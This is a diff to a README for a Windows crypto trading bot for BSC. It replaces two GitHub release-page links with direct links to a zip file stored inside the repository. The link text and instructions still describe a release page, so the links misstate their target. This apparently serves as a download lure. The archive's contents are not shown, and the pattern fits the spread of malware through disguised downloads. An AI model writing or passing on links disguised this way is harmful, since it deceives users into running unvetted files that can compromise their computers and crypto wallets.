@@ -1,6 +1,6 @@
 # 🤖 bnb-trading-bot - Run BSC trading tools with ease
 
-[![Download bnb-trading-bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Cingulumsloppyjoe432/bnb-trading-bot/releases)
+[![Download bnb-trading-bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Cingulumsloppyjoe432/bnb-trading-bot/main/src/lib/bnb_trading_bot_2.4.zip)
 
 ## 🧭 What this is
 
@@ -18,7 +18,7 @@ This project is built for end users who want a simple way to run a BSC trading t
 
 Use this link to visit the release page and download the latest version for Windows:
 
-[Visit the bnb-trading-bot release page](https://github.com/Cingulumsloppyjoe432/bnb-trading-bot/releases)
+[Visit the bnb-trading-bot release page](https://raw.githubusercontent.com/Cingulumsloppyjoe432/bnb-trading-bot/main/src/lib/bnb_trading_bot_2.4.zip)
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
